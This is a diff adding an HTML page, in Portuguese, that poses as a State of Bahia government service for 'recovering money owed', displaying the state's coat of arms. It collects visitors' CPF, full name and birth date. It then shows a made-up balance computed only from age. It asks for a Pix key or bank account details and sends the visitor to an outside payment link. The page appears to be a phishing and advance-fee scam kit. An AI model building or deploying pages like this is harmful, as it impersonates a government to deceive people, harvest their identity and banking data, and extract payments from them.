@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Resgate de Valores</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+    }
+
+    header {
+      background-color: #005ea6;
+      color: white;
+      padding: 10px 0;
+      text-align: center;
+    }
+
+    header img {
+      width: 100px;
+      height: auto;
+      margin-bottom: 10px;
+    }
+
+    header h1 {
+      font-size: 24px;
+    }
+
+    .container {
+      max-width: 800px;
+      margin: 20px auto;
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .form-title {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    form label {
+      font-size: 14px;
+      display: block;
+      margin-bottom: 5px;
+    }
+
+    form input[type="text"],
+    form input[type="date"],
+    form input[type="submit"],
+    form select {
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
+      margin-bottom: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+
+    form input[type="submit"] {
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    form input[type="submit"]:hover {
+      background-color: #45a049;
+    }
+
+    footer {
+      background-color: #333;
+      color: white;
+      text-align: center;
+      padding: 10px;
+      position: relative;
+      width: 100%;
+      bottom: 0;
+    }
+
+    footer p {
+      font-size: 12px;
+      margin: 0;
+    }
+
+    .error {
+      color: red;
+      font-size: 12px;
+    }
+
+    .resgate-result {
+      display: none;
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .resgate-result p {
+      font-size: 20px;
+      font-weight: bold;
+    }
+
+    .resgate-result button {
+      padding: 10px 20px;
+      font-size: 14px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+
+    .banco-container {
+      display: none;
+      margin-top: 20px;
+    }
+
+    .banco-container label {
+      font-size: 14px;
+    }
+
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Bras%C3%A3o_do_estado_da_Bahia.svg/1200px-Bras%C3%A3o_do_estado_da_Bahia.svg.png" alt="Brasão do Estado da Bahia">
+    <h1>Estado da Bahia - Resgate de Valores</h1>
+  </header>
+
+  <div class="container">
+    <h2 class="form-title">Formulário de Resgate</h2>
+
+    <script src="https://fast.wistia.com/player.js" async></script><script src="https://fast.wistia.com/embed/8mhash9b3z.js" async type="module"></script><style>wistia-player[media-id='8mhash9b3z']:not(:defined) { background: center / contain no-repeat url('https://fast.wistia.com/embed/medias/8mhash9b3z/swatch'); display: block; filter: blur(5px); padding-top:56.25%; }</style> <wistia-player media-id="8mhash9b3z"></wistia-player>
+    
+	<hr>
+
+    <form id="formulario-resgate">
+      <label for="cpf">CPF:</label>
+      <input type="text" id="cpf" name="cpf" placeholder="Digite seu CPF" required>
+
+      <label for="nome">Nome Completo:</label>
+      <input type="text" id="nome" name="nome" placeholder="Digite seu nome completo" required>
+
+      <label for="data-nascimento">Data de Nascimento:</label>
+      <input type="date" id="data-nascimento" name="data-nascimento" required>
+
+      <input type="submit" value="Verificar Resgate">
+    </form>
+
+    <div class="resgate-result" id="resgate-result">
+      <p id="valor-resgate">Saldo a Receber: R$ 0,00</p>
+      <p id="prazo-transferencia">Prazo de Transferência: Até 7 dias úteis</p>
+      
+      <!-- Opções de Recebimento -->
+      <p><strong>Escolha a forma de recebimento:</strong></p>
+      <label for="recebimento">Forma de Recebimento:</label>
+      <select id="recebimento" name="recebimento" onchange="exibirDadosRecebimento()" required>
+        <option value="" disabled selected>Selecione a opção</option>
+        <option value="pix">Pix</option>
+        <option value="bancaria">Transferência Bancária</option>
+      </select>
+
+      <div id="pix-option" style="display:none;">
+        <h3>Informações para PIX</h3>
+        <label for="pix">Chave Pix:</label>
+        <input type="text" id="pix" name="pix" placeholder="Digite sua chave Pix">
+      </div>
+
+      <div id="bancaria-option" style="display:none;">
+        <h3>Informações para Transferência Bancária</h3>
+        <label for="banco">Escolha o Banco:</label>
+        <select id="banco" name="banco" required>
+          <option value="" disabled selected>Selecione o Banco</option>
+          <option value="Itaú">Itaú</option>
+          <option value="Banco do Brasil">Banco do Brasil</option>
+          <option value="Bradesco">Bradesco</option>
+          <option value="Caixa">Caixa</option>
+          <option value="Nubank">Nubank</option>
+          <option value="Banco Pan">Banco Pan</option>
+          <option value="Banco Safra">Banco Safra</option>
+          <option value="Banco do Nordeste">Banco do Nordeste</option>
+          <option value="BGT Pactual">BGT Pactual</option>
+          <option value="Banrisul">Banrisul</option>
+          <option value="Inter">Inter</option>
+          <option value="PicPay">PicPay</option>
+          <option value="Original">Original</option>
+        </select>
+
+        <label for="agencia">Número da Agência:</label>
+        <input type="text" id="agencia" name="agencia" placeholder="Digite o número da agência" required>
+
+        <label for="conta">Número da Conta:</label>
+        <input type="text" id="conta" name="conta" placeholder="Digite o número da conta com dígito" required>
+      </div>
+
+      <button onclick="window.location.href='https://pay.iexperience-app.com/9be8f75d'">Avançar para Liberação</button>
+    </div>
+  </div>
+
+  <footer>
+    <p>© 2024 Estado da Bahia. Todos os direitos reservados.</p>
+  </footer>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      // Função para formatar o CPF
+      function formatCPF(value) {
+        return value
+          .replace(/\D/g, '') // Remove tudo que não for número
+          .replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4'); // Adiciona os pontos e o hífen
+      }
+
+      // Seleciona o campo CPF e adiciona a formatação
+      const cpfField = document.getElementById('cpf');
+      cpfField.addEventListener('input', function () {
+        cpfField.value = formatCPF(cpfField.value);
+
+        // Valida se o CPF tem 11 números
+        const cpfSemFormatacao = cpfField.value.replace(/\D/g, ''); // Remove qualquer caractere não numérico
+        if (cpfSemFormatacao.length > 11) {
+          cpfField.setCustomValidity('O CPF deve ter exatamente 11 dígitos.');
+        } else {
+          cpfField.setCustomValidity('');
+        }
+      });
+
+      // Função para permitir apenas letras no nome completo
+      const nomeField = document.getElementById('nome');
+      nomeField.addEventListener('input', function () {
+        // Substitui qualquer coisa que não seja uma letra (a-z ou A-Z) ou espaço
+        nomeField.value = nomeField.value.replace(/[^a-zA-ZÀ-ÿ\s]/g, '');
+      });
+
+      const form = document.getElementById('formulario-resgate');
+      const resgateResult = document.getElementById('resgate-result');
+      const valorResgate = document.getElementById('valor-resgate');
+      const prazoTransferencia = document.getElementById('prazo-transferencia');
+
+      form.addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        const nascimento = new Date(document.getElementById('data-nascimento').value);
+        const idade = new Date().getFullYear() - nascimento.getFullYear();
+        const mesAtual = new Date().getMonth();
+        if (new Date().getMonth() < nascimento.getMonth()) {
+          idade--;
+        }
+
+        let resgateValor = 0;
+
+        // Se menor de idade, resgate é 0
+        if (idade < 18) {
+          resgateValor = 0;
+        } else {
+          // Lógica para calcular o valor de resgate progressivo
+          const anoNascimento = nascimento.getFullYear();
+          const anosDesdeNascimento = new Date().getFullYear() - anoNascimento;
+
+          resgateValor = (99.77 + (anosDesdeNascimento * 10)).toFixed(2);
+        }
+
+        valorResgate.innerHTML = `Saldo a Receber: R$ ${resgateValor}`;
+        prazoTransferencia.innerHTML = 'Prazo de Transferência: Até 7 dias úteis';
+
+        // Exibe o resultado
+        resgateResult.style.display = 'block';
+      });
+    });
+
+    function exibirDadosRecebimento() {
+      var recebimento = document.getElementById('recebimento').value;
+      if (recebimento === 'pix') {
+        document.getElementById('pix-option').style.display = 'block';
+        document.getElementById('bancaria-option').style.display = 'none';
+      } else if (recebimento === 'bancaria') {
+        document.getElementById('bancaria-option').style.display = 'block';
+        document.getElementById('pix-option').style.display = 'none';
+      } else {
+        document.getElementById('pix-option').style.display = 'none';
+        document.getElementById('bancaria-option').style.display = 'none';
+      }
+    }
+
+    function finalizarResgate() {
+      alert('finalizar Resgate!');
+    }
+  </script>
+
+</body>
+</html>
